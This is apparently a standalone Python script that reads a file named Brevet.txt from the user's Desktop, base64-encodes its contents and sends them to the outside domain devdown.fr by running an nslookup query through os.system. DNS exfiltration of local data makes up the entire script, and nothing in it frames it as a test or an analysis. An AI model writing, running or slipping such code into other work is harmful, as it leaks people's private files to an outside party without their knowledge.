import base64, os, sys, time, random

magic = random.random()
domain = "devdown.fr"
fileName = "\Brevet.txt"
filePath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + fileName

handler = open(filePath, "r")
data = handler.read()
b64String = base64.b64encode(data.encode('utf-8'))
handler.close()
payload = "nslookup " + str(magic) + ".sep." + b64String.decode("utf-8") + "." + domain
os.system(payload)
